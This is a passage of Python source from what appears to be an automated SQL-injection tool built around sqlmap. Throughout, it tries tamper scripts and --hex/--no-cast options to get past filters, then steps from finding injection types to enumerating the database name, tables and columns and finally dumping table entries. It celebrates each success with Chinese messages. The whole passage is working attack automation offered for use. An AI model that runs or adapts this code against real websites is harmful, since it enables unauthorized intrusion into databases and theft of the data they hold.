                            self.log_config_file, 'default', 'finished_command_list'))
                        if self.sm_no_cast_command_with_tamper + " --technique=USE" in current_finished_command_list:
                            pass
                        else:
                            self.output.os_system_combine_argv_with_bottom_status(
                                self.sm_no_cast_command_with_tamper + " --technique=USE")
                            current_finished_command_list.append(
                                self.sm_no_cast_command_with_tamper + " --technique=USE")

                            sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                            if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
                                self.output.good_print(
                                    "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了U|E|S一种以上的高效注入方法" % tamper_string, 'red')
                                flag = 1
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'hex_or_no_cast', ['--no-cast'])

            else:
                # 当前已经获取--hex或者--no-cast选项
                # hex_or_no_cast列表只有一个,如果先检测到--hex选项可以用则不再检测--no-cast选项是否可用
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=USE"
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if sm_hex_or_no_cast_command_with_tamper in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper)
                    current_finished_command_list.append(sm_hex_or_no_cast_command_with_tamper)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    sqli_type = self.get_sqli_type_from_log_file(self.log_file)
                    if 'U' in sqli_type or 'E' in sqli_type or 'S' in sqli_type:
                        self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了U|E|S一种以上的高效注入方法" %
                                               (tamper_string, hex_or_no_cast), 'red')
                        flag = 1

            if flag == 1:
                # 下面将当前使用的tamper_string中的tamper写入到tamper_list中,直接写tamper_string中的tamper而不是
                # 先判断tamper_string中是否有tamper_list中不存在的tamper再将不存在的tamper写入tamper_list是因为这
                # 里的tamper_string已经是在tamper_list的基础上形成的最终的tamper_string,因为每次测试tamper时,只要
                # 测到该tamper可用,以后每次新的tamper测试都会在这个可用tamper的基础上再加上新测试的tamper进行测试
                if "," not in tamper_string:
                    # 当前使用的tamper_string只有一个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', [tamper_string])
                else:
                    # 当前使用的tamper_string有多个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', tamper_string.split(","))
                # return 1代表当前tamper达到了目的
                return 1

            # return 0代表当前tamper没有达到目的
            return 0

        if forwhat == 'db_name':
            # 为了获取所有数据库而运行的test_tamper_string

            flag = 0
            self.output.good_print("现在尝试用tamper来获取当前url的数据库名...", 'green')
            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前还没有获取--hex或者--no-cast选项
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command_with_tamper + " --technique=USE" + " --current-db" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            self.sm_command_with_tamper + " --technique=USE" + " --current-db")
                        current_finished_command_list.append(
                            self.sm_command_with_tamper + " --technique=USE" + " --current-db")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        db_name_list = self.get_db_name_from_log_file(self.log_file)
                        if db_name_list != 0 and db_name_list != []:
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前url的数据库名" %
                                            tamper_string, 'red')
                            flag = 1

                if flag == 0:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command_with_tamper + " --technique=BQT" + " --current-db" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            self.sm_command_with_tamper + " --technique=BQT" + " --current-db")
                        current_finished_command_list.append(
                            self.sm_command_with_tamper + " --technique=BQT" + " --current-db")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        db_name_list = self.get_db_name_from_log_file(self.log_file)
                        if db_name_list != 0 and db_name_list != []:
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前url的数据库名" %
                                                   tamper_string, 'red')
                            flag = 1

                if flag == 0:
                    if self.has_good_sqli_type == 1:
                        current_finished_command_list = eval(get_key_value_from_config_file(
                            self.log_config_file, 'default', 'finished_command_list'))
                        if self.sm_hex_command_with_tamper + " --technique=USE" + " --current-db" in current_finished_command_list:
                            pass
                        else:
                            self.output.os_system_combine_argv_with_bottom_status(
                                self.sm_hex_command_with_tamper + " --technique=USE" + " --current-db")
                            current_finished_command_list.append(
                                self.sm_hex_command_with_tamper + " --technique=USE" + " --current-db")
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'finished_command_list', current_finished_command_list)

                            db_name_list = self.get_db_name_from_log_file(self.log_file)
                            if db_name_list != 0 and db_name_list != []:
                                self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前url的数据库名" %
                                                tamper_string, 'red')
                                flag = 1
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'hex_or_no_cast', ['--hex'])

                    if flag == 0:
                        current_finished_command_list = eval(get_key_value_from_config_file(
                            self.log_config_file, 'default', 'finished_command_list'))
                        if self.sm_hex_command_with_tamper + " --technique=BQT" + " --current-db" in current_finished_command_list:
                            pass
                        else:
                            self.output.os_system_combine_argv_with_bottom_status(
                                self.sm_hex_command_with_tamper + " --technique=BQT" + " --current-db")
                            current_finished_command_list.append(
                                self.sm_hex_command_with_tamper + " --technique=BQT" + " --current-db")
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'finished_command_list', current_finished_command_list)

                            db_name_list = self.get_db_name_from_log_file(self.log_file)
                            if db_name_list != 0 and db_name_list != []:
                                self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前url的数据库名" %
                                                tamper_string, 'red')
                                flag = 1
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'hex_or_no_cast', ['--hex'])
                    if flag == 0:
                        if self.has_good_sqli_type == 1:
                            current_finished_command_list = eval(get_key_value_from_config_file(
                                self.log_config_file, 'default', 'finished_command_list'))
                            if self.sm_no_cast_command_with_tamper + " --technique=USE" + " --current-db" in current_finished_command_list:
                                pass
                            else:
                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper +
                                                                         " --technique=USE" + " --current-db")
                                current_finished_command_list.append(
                                    self.sm_no_cast_command_with_tamper + " --technique=USE" + " --current-db")
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'finished_command_list', current_finished_command_list)

                                db_name_list = self.get_db_name_from_log_file(self.log_file)
                                if db_name_list != 0 and db_name_list != []:
                                    self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前url的数据库名" %
                                                    tamper_string, 'red')
                                    flag = 1
                                    update_config_file_key_value(
                                        self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])

                        if flag == 0:
                            current_finished_command_list = eval(get_key_value_from_config_file(
                                self.log_config_file, 'default', 'finished_command_list'))
                            if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " --current-db" in current_finished_command_list:
                                pass
                            else:
                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper +
                                                                         " --technique=BQT" + " --current-db")
                                current_finished_command_list.append(
                                    self.sm_no_cast_command_with_tamper + " --technique=BQT" + " --current-db")
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'finished_command_list', current_finished_command_list)

                                db_name_list = self.get_db_name_from_log_file(self.log_file)
                                if db_name_list != 0 and db_name_list != []:
                                    self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前url的数据库名" %
                                                    tamper_string, 'red')
                                    flag = 1
                                    update_config_file_key_value(
                                        self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])

            else:
                # 当前已经获取--hex或者--no-cast选项
                # hex_or_no_cast列表只有一个,如果先检测到--hex选项可以用则不再检测--no-cast选项是否可用
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                if self.has_good_sqli_type == 1:
                    sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=USE"

                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command_with_tamper + " --current-db" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            sm_hex_or_no_cast_command_with_tamper + " --current-db")
                        current_finished_command_list.append(
                            sm_hex_or_no_cast_command_with_tamper + " --current-db")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        db_name_list = self.get_db_name_from_log_file(self.log_file)
                        if db_name_list != 0 and db_name_list != []:
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前url的数据库名" %
                                                   (tamper_string, hex_or_no_cast), 'red')
                            flag = 1

                if flag == 0:
                    sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=BQT"
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command_with_tamper + " --current-db" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            sm_hex_or_no_cast_command_with_tamper + " --current-db")
                        current_finished_command_list.append(
                            sm_hex_or_no_cast_command_with_tamper + " --current-db")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        db_name_list = self.get_db_name_from_log_file(self.log_file)
                        if db_name_list != 0 and db_name_list != []:
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前url的数据库名" %
                                                   (tamper_string, hex_or_no_cast), 'red')
                            flag = 1

            if flag == 1:
                # 下面将当前使用的tamper_string中的tamper写入到tamper_list中,直接写tamper_string中的tamper而不是
                # 先判断tamper_string中是否有tamper_list中不存在的tamper再将不存在的tamper写入tamper_list是因为这
                # 里的tamper_string已经是在tamper_list的基础上形成的最终的tamper_string,因为每次测试tamper时,只要
                # 测到该tamper可用,以后每次新的tamper测试都会在这个可用tamper的基础上再加上新测试的tamper进行测试
                if "," not in tamper_string:
                    # 当前使用的tamper_string只有一个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', [tamper_string])
                else:
                    # 当前使用的tamper_string有多个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', tamper_string.split(","))
                # return 1代表当前tamper达到了目的
                return 1

            # return 0代表当前tamper没有达到目的
            return 0

        if forwhat == 'table_name':
            # 为了获取一个数据库的所有表名的值而运行的test_tamper_string
            flag = 0
            self.output.good_print("现在尝试用tamper来获取当前数据库的表名...", 'green')
            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
            db_name = self.get_db_name_from_log_file(self.log_file)[0]
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前还没有获取--hex或者--no-cast选项
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command_with_tamper + " --technique=USE" + " --tables" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" + " --tables")
                        current_finished_command_list.append(
                            self.sm_command_with_tamper + " --technique=USE" + " --tables")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        table_name = self.get_table_name_from_log_file(self.log_file)
                        if table_name != 0 and table_name != "":
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表名" %
                                            tamper_string, 'red')
                            flag = 1

                if flag == 0:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command_with_tamper + " --technique=BQT" + " --tables" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" +
                                                                 " --tables")
                        current_finished_command_list.append(
                            self.sm_command_with_tamper + " --technique=BQT" + " --tables")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        table_name = self.get_table_name_from_log_file(self.log_file)
                        if table_name != 0 and table_name != "":
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表名" %
                                                   tamper_string, 'red')
                            flag = 1

                if flag == 0:
                    if self.has_good_sqli_type == 1:
                        current_finished_command_list = eval(get_key_value_from_config_file(
                            self.log_config_file, 'default', 'finished_command_list'))
                        if self.sm_hex_command_with_tamper + " --technique=USE" + " --tables" in current_finished_command_list:
                            pass
                        else:
                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" +
                                                                     " --tables")
                            current_finished_command_list.append(
                                self.sm_hex_command_with_tamper + " --technique=USE" + " --tables")
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'finished_command_list', current_finished_command_list)

                            table_name = self.get_table_name_from_log_file(self.log_file)
                            if table_name != 0 and table_name != "":
                                self.output.good_print(
                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表名" % tamper_string, 'red')
                                flag = 1
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'hex_or_no_cast', ['--hex'])

                    if flag == 0:
                        current_finished_command_list = eval(get_key_value_from_config_file(
                            self.log_config_file, 'default', 'finished_command_list'))
                        if self.sm_hex_command_with_tamper + " --technique=BQT" + " --tables" in current_finished_command_list:
                            pass
                        else:
                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" +
                                                                     " --tables")
                            current_finished_command_list.append(
                                self.sm_hex_command_with_tamper + " --technique=BQT" + " --tables")
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'finished_command_list', current_finished_command_list)

                            table_name = self.get_table_name_from_log_file(self.log_file)
                            if table_name != 0 and table_name != "":
                                self.output.good_print(
                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表名" % tamper_string, 'red')
                                flag = 1
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'hex_or_no_cast', ['--hex'])

                    if flag == 0:
                        if self.has_good_sqli_type == 1:
                            current_finished_command_list = eval(get_key_value_from_config_file(
                                self.log_config_file, 'default', 'finished_command_list'))
                            if self.sm_no_cast_command_with_tamper + " --technique=USE" + " --tables" in current_finished_command_list:
                                pass
                            else:
                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper +
                                                                         " --technique=USE" + " --tables")
                                current_finished_command_list.append(
                                    self.sm_no_cast_command_with_tamper + " --technique=USE" + " --tables")
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'finished_command_list', current_finished_command_list)

                                table_name = self.get_table_name_from_log_file(self.log_file)
                                if table_name != 0 and table_name != "":
                                    self.output.good_print(
                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表名" % tamper_string, 'red')
                                    flag = 1
                                    update_config_file_key_value(
                                        self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])

                        if flag == 0:
                            current_finished_command_list = eval(get_key_value_from_config_file(
                                self.log_config_file, 'default', 'finished_command_list'))
                            if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " --tables" in current_finished_command_list:
                                pass
                            else:
                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper +
                                                                         " --technique=BQT" + " --tables")
                                current_finished_command_list.append(
                                    self.sm_no_cast_command_with_tamper + " --technique=BQT" + " --tables")
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'finished_command_list', current_finished_command_list)

                                table_name = self.get_table_name_from_log_file(self.log_file)
                                if table_name != 0 and table_name != "":
                                    self.output.good_print(
                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表名" % tamper_string, 'red')
                                    flag = 1
                                    update_config_file_key_value(
                                        self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])

            else:
                # 当前已经获取--hex或者--no-cast选项
                # hex_or_no_cast列表只有一个,如果先检测到--hex选项可以用则不再检测--no-cast选项是否可用
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                if self.has_good_sqli_type == 1:
                    sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=USE"

                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command_with_tamper + " --tables" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            sm_hex_or_no_cast_command_with_tamper + " --tables")
                        current_finished_command_list.append(
                            sm_hex_or_no_cast_command_with_tamper + " --tables")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        table_name = self.get_table_name_from_log_file(self.log_file)
                        if table_name != 0 and table_name != "":
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表名" %
                                                   (tamper_string, hex_or_no_cast), 'red')
                            flag = 1

                if flag == 0:
                    sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=BQT"
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command_with_tamper + " --tables" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            sm_hex_or_no_cast_command_with_tamper + " --tables")
                        current_finished_command_list.append(
                            sm_hex_or_no_cast_command_with_tamper + " --tables")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        table_name = self.get_table_name_from_log_file(self.log_file)
                        if table_name != 0 and table_name != "":
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表名" %
                                                   (tamper_string, hex_or_no_cast), 'red')
                            flag = 1

            if flag == 1:
                # 下面将当前使用的tamper_string中的tamper写入到tamper_list中,直接写tamper_string中的tamper而不是
                # 先判断tamper_string中是否有tamper_list中不存在的tamper再将不存在的tamper写入tamper_list是因为这
                # 里的tamper_string已经是在tamper_list的基础上形成的最终的tamper_string,因为每次测试tamper时,只要
                # 测到该tamper可用,以后每次新的tamper测试都会在这个可用tamper的基础上再加上新测试的tamper进行测试
                if "," not in tamper_string:
                    # 当前使用的tamper_string只有一个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', [tamper_string])
                else:
                    # 当前使用的tamper_string有多个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', tamper_string.split(","))
                # return 1代表当前tamper达到了目的
                return 1

            # return 0代表当前tamper没有达到目的
            return 0

        if forwhat == 'column_name':
            # 为了获取一个数据库的一个表的所有列名的值而运行的test_tamper_string
            flag = 0
            self.output.good_print("现在尝试用tamper来获取当前数据库的表的列名...", 'green')
            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
            db_name = self.get_db_name_from_log_file(self.log_file)[0]
            table_name = self.get_table_name_from_log_file(self.log_file)
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前还没有获取--hex或者--no-cast选项
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" +
                                                                 " -T " + table_name + " --columns")
                        current_finished_command_list.append(
                            self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_column_name = self.get_column_name_from_log_file(self.log_file)
                        if has_column_name == 1:
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表的列名" %
                                                   tamper_string, 'red')
                            flag = 1

                if flag == 0:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=BQT" +
                                                                 " -T " + table_name + " --columns")
                        current_finished_command_list.append(
                            self.sm_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_column_name = self.get_column_name_from_log_file(self.log_file)
                        if has_column_name == 1:
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s获得了当前数据库的表的列名" %
                                                   tamper_string, 'red')
                            flag = 1

                if flag == 0:
                    if self.has_good_sqli_type == 1:
                        current_finished_command_list = eval(get_key_value_from_config_file(
                            self.log_config_file, 'default', 'finished_command_list'))
                        if self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                            pass
                        else:
                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=USE" +
                                                                     " -T " + table_name + " --columns")
                            current_finished_command_list.append(
                                self.sm_hex_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns")
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'finished_command_list', current_finished_command_list)

                            has_column_name = self.get_column_name_from_log_file(self.log_file)
                            if has_column_name == 1:
                                self.output.good_print(
                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名" % tamper_string, 'red')
                                flag = 1
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'hex_or_no_cast', ['--hex'])

                    if flag == 0:
                        current_tamper_list = eval(get_key_value_from_config_file(
                            self.log_config_file, 'default', 'finished_command_list'))
                        if self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                            pass
                        else:
                            self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command_with_tamper + " --technique=BQT" +
                                                                     " -T " + table_name + " --columns")
                            current_finished_command_list.append(
                                self.sm_hex_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns")
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'finished_command_list', current_finished_command_list)

                            has_column_name = self.get_column_name_from_log_file(self.log_file)
                            if has_column_name == 1:
                                self.output.good_print(
                                    "恭喜大爷!!! 使用当前tamper:%s和--hex选项获得了当前数据库的表的列名" % tamper_string, 'red')
                                flag = 1
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'hex_or_no_cast', ['--hex'])

                    if flag == 0:
                        if self.has_good_sqli_type == 1:
                            current_finished_command_list = eval(get_key_value_from_config_file(
                                self.log_config_file, 'default', 'finished_command_list'))
                            if self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                                pass
                            else:
                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=USE" +
                                                                         " -T " + table_name + " --columns")
                                current_finished_command_list.append(
                                    self.sm_no_cast_command_with_tamper + " --technique=USE" + " -T " + table_name + " --columns")
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'finished_command_list', current_finished_command_list)

                                has_column_name = self.get_column_name_from_log_file(self.log_file)
                                if has_column_name == 1:
                                    self.output.good_print(
                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名" % tamper_string, 'red')
                                    flag = 1
                                    update_config_file_key_value(
                                        self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])

                        if flag == 0:
                            current_finished_command_list = eval(get_key_value_from_config_file(
                                self.log_config_file, 'default', 'finished_command_list'))
                            if self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                                pass
                            else:
                                self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command_with_tamper + " --technique=BQT" +
                                                                         " -T " + table_name + " --columns")
                                current_finished_command_list.append(
                                    self.sm_no_cast_command_with_tamper + " --technique=BQT" + " -T " + table_name + " --columns")
                                update_config_file_key_value(self.log_config_file, 'default',
                                                             'finished_command_list', current_finished_command_list)

                                has_column_name = self.get_column_name_from_log_file(self.log_file)
                                if has_column_name == 1:
                                    self.output.good_print(
                                        "恭喜大爷!!! 使用当前tamper:%s和--no-cast选项获得了当前数据库的表的列名" % tamper_string, 'red')
                                    flag = 1
                                    update_config_file_key_value(
                                        self.log_config_file, 'default', 'hex_or_no_cast', ['--no-cast'])

            else:
                # 当前已经获取--hex或者--no-cast选项
                # hex_or_no_cast列表只有一个,如果先检测到--hex选项可以用则不再检测--no-cast选项是否可用
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                if self.has_good_sqli_type == 1:
                    sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=USE"

                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
                                                                 " -T " + table_name + " --columns")
                        current_finished_command_list.append(
                            sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_column_name = self.get_column_name_from_log_file(self.log_file)
                        if has_column_name == 1:
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表的列名" %
                                                   (tamper_string, hex_or_no_cast), 'red')
                            flag = 1

                if flag == 0:
                    sm_hex_or_no_cast_command_with_tamper = self.sm_command_with_tamper + " " + hex_or_no_cast + " --technique=BQT"
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command_with_tamper + 
                                                                 " -T " + table_name + " --columns")
                        current_finished_command_list.append(
                            sm_hex_or_no_cast_command_with_tamper + " -T " + table_name + " --columns")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_column_name = self.get_column_name_from_log_file(self.log_file)
                        if has_column_name == 1:
                            self.output.good_print("恭喜大爷!!! 使用当前tamper:%s和已经得到的%s选项获得了当前数据库的表的列名" %
                                                   (tamper_string, hex_or_no_cast), 'red')
                            flag = 1

            if flag == 1:
                # 下面将当前使用的tamper_string中的tamper写入到tamper_list中,直接写tamper_string中的tamper而不是
                # 先判断tamper_string中是否有tamper_list中不存在的tamper再将不存在的tamper写入tamper_list是因为这
                # 里的tamper_string已经是在tamper_list的基础上形成的最终的tamper_string,因为每次测试tamper时,只要
                # 测到该tamper可用,以后每次新的tamper测试都会在这个可用tamper的基础上再加上新测试的tamper进行测试
                if "," not in tamper_string:
                    # 当前使用的tamper_string只有一个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', [tamper_string])
                else:
                    # 当前使用的tamper_string有多个tamper
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'tamper_list', tamper_string.split(","))
                # return 1代表当前tamper达到了目的
                return 1

            # return 0代表当前tamper没有达到目的
            return 0

        if forwhat == 'entries':
            # 为了获取一个数据库的一个表的所有列的所有具体内容[一个表的具体数据]而运行的test_tamper_string
            flag = 0
            self.output.good_print("现在尝试用tamper来获取当前数据库的表的列名的具体数据...", 'green')
            self.output.good_print("目前使用的tamper是%s" % tamper_string, 'green')
            #db_name = self.get_db_name_from_log_file(self.log_file)[0]
            table_name = self.get_table_name_from_log_file(self.log_file)
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前还没有获取--hex或者--no-cast选项
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command_with_tamper + " --technique=USE" + 
                                                                 " -T " + table_name + " --dump --stop 3")
                        current_finished_command_list.append(
                            self.sm_command_with_tamper + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_entries = self.get_entries_from_log_file(self.log_file)
                        if has_entries == 1:
